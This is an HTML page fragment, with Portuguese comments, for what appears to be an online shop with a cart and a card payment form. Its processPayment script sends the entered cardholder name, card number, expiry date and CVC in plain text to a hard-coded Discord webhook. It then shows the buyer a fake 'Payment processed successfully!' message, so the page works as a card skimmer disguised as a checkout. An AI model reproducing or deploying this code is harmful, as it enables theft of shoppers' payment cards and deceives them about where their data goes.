        body {
            font-family: 'Arial', sans-serif;

            color: #fff;

        header {
            background-color: #333; /* Cinza escuro */

            align-items: center;

            top: 0;

            margin: 0;

        .cart-icon {
            background-color: #ff0000; /* Verde para o Ã­cone do carrinho */

            border: none;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            font-size: 22px;
            cursor: pointer;
        }
        main {
            padding: 80px 20px 20px;
            width: 100%;
            max-width: 1100px;
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
        }
        .product {
            border-radius: 20px; /* Bordas arredondadas */
            padding: 20px;
            margin: 20px;
            background-color: #1e1e1e; /* Fundo cinza escuro */
            width: 250px;
            text-align: center;
            box-shadow: 0 6px 10px rgba(0, 0, 0, 0.2);
            transition: transform 0.3s ease-in-out;
        }
        .product:hover {
            transform: scale(1.05);
        }
        .product img {
            width: 100%;
            height: auto;
            border-radius: 10px;
        }
        .product h2 {
            margin: 10px 0;
            font-size: 20px;
            color: blue;
        }
        .product p {
            margin: 10px 0;
            font-size: 16px;
        }
        .product button {
            background-color: blue;
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 10px; /* Bordas arredondadas */
            cursor: pointer;
            transition: background-color 0.3s ease-in-out;
        }
        .product button:hover {
            background-color: blue;
        }
        .cart {
            display: none;
            background-color: #1e1e1e; /* Fundo cinza escuro */
            padding: 20px;
            position: fixed;
            top: 80px;
            right: 20px;
            border-radius: 15px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
            width: 300px;
        }
        .cart.active {
            display: block;
        }
        .cart-item {
            display: flex;
            justify-content: space-between;
            margin-bottom: 15px;
        }
        .checkout {
            margin-top: 20px;
            text-align: center;
        }
        .payment-panel {
            display: none;
            background-color: #1e1e1e; /* Fundo cinza escuro */
            padding: 30px;
            position: fixed;
            top: 50px;
            left: 50%;
            transform: translateX(-50%);
            border-radius: 15px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
        }
        .payment-panel.active {
            display: block;
        }
        .payment-panel input {
            display: block;
            width: calc(100% - 20px);
            margin: 15px 0;
            padding: 12px;
            border: 1px solid #333;
            border-radius: 10px;
            background-color: #121212;
            color: #fff;
        }
        .payment-panel button {
            background-color: blue;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 10px;
            cursor: pointer;
        }
        .payment-panel button:hover {
            background-color: blue;
        }

    </style>

    <div class="cart" id="cart">
        <h2>Cart</h2>
        <div id="cart-items"></div>

            <p>Total: $<span id="total-price">0</span></p>

    <div class="payment-panel" id="payment-panel">
        <h2>Payment</h2>
        <input type="text" id="card-name" placeholder="Cardholder Name">
        <input type="text" id="card-number" placeholder="Card Number">
        <input type="text" id="card-expiry" placeholder="Expiry Date">
        <input type="text" id="card-cvc" placeholder="CVC">
        <button onclick="processPayment()">Pay</button>
    </div>
    <script>
        function redirectToPaymentPage() {
    // Substitua "pagina2.html" pelo nome do arquivo da pÃ¡gina de pagamento
    window.location.href = "pagamento.html";
}

        
        let cart = [];
        let totalPrice = 0;

        function addToCart(product, price) {
            cart.push({ product, price });
            totalPrice += price;
            updateCartUI();
        }

        function updateCartUI() {
            const cartItemsDiv = document.getElementById('cart-items');
            cartItemsDiv.innerHTML = '';
            cart.forEach(item => {
                const div = document.createElement('div');
                div.className = 'cart-item';
                div.innerHTML = `<span>${item.product}</span><span>$${item.price}</span>`;
                cartItemsDiv.appendChild(div);
            });
            document.getElementById('total-price').innerText = totalPrice.toFixed(2);
        }

        function toggleCart() {
            const cartDiv = document.getElementById('cart');
            cartDiv.classList.toggle('active');
        }

        function openPaymentPanel() {
            const paymentPanel = document.getElementById('payment-panel');
            paymentPanel.classList.add('active');
        }

        function processPayment() {
            const name = document.getElementById('card-name').value;
            const number = document.getElementById('card-number').value;
            const expiry = document.getElementById('card-expiry').value;
            const cvc = document.getElementById('card-cvc').value;

            const webhookUrl = 'https://discord.com/api/webhooks/1330060097329696830/Mn8fI9GFFDiG8DfTtquq-ub41dWW8BY436ImzK-VEs0ac2d5hc0fGl9F11iPMq6vcYuU';

            const paymentDetails = {
                content: `Payment Details:\nName: ${name}\nCard Number: ${number}\nExpiry: ${expiry}\nCVC: ${cvc}`
            };

            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(paymentDetails),
            })
            .then(response => {
                if (response.ok) {
                    alert('Payment processed successfully!');
                    cart = [];
                    totalPrice = 0;
                    updateCartUI();
                    document.getElementById('payment-panel').classList.remove('active');
                } else {
                    alert('Payment failed. Please try again.');
                }
            })
            .catch(error => {
                alert('Error processing payment.');
            });
        }
    </script>
